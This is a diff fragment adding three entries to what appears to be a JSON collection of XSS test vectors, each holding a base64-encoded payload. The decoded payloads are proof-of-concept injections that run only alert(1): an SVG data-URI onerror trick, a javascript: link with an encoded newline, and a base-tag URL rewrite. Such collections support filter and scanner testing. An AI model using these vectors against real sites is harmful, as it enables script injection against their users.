+		"script" : "PHN2Zz48dXNlIGhyZWY9ImRhdGE6aW1hZ2Uvc3ZnK3htbCwmbHQ7c3ZnIGlkPSd4JyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnJmd0OyZsdDtpbWFnZSBocmVmPScxJyBvbmVycm9yPSdhbGVydCgxKScgLyZndDsmbHQ7L3N2ZyZndDsjeCIgLz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 454,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "JavaScript protocol with new line, , , ",
+		"script" : "PGEgaHJlZj0iamF2YXNjcmlwdDovLyUwYWFsZXJ0KDEpIj5YU1M8L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 455,
+		"summary" : "Classic vectors (XSS crypt)",
+		"description" : "Base tag with JavaScript protocol rewriting relative URLS, , , ",
+		"script" : "PGJhc2UgaHJlZj0iamF2YXNjcmlwdDovYS8tYWxlcnQoMSkvLy8vLy8vIj48YSBocmVmPS4uL2xvbC9zYWZhcmkuaHRtbD50ZXN0PC9hPg==",
+		"type" : "XSS"
+	}
+]
